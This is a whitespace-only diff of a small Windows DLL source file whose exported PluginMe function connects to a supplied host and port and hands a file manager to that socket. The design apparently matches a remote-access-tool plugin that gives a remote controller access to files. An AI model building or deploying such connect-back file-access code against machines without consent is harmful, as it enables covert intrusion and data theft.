@@ -6,24 +6,24 @@
 #pragma comment(lib,"kernel32.lib")
 #pragma comment(lib,"user32.lib")
 
-BOOL APIENTRY DllMain( HANDLE hModule, 
-                       DWORD  ul_reason_for_call, 
+BOOL APIENTRY DllMain( HANDLE hModule,
+                       DWORD  ul_reason_for_call,
                        LPVOID lpReserved
-					 )
+                     )
 {
     return TRUE;
 }
 
 //文件夹管理
-extern "C" __declspec(dllexport) BOOL PluginMe(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam)     
+extern "C" __declspec(dllexport) BOOL PluginMe(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam)
 {
-	CClientSocket	socketClient;
-	if (!socketClient.Connect(lpszHost, nPort))
-		return -1;
-	
-	CFileManager	manager(&socketClient);
-	socketClient.run_event_loop();
-	
-	return 0;
+    CClientSocket	socketClient;
+    if (!socketClient.Connect(lpszHost, nPort))
+        return -1;
+
+    CFileManager	manager(&socketClient);
+    socketClient.run_event_loop();
+
+    return 0;
 }
 
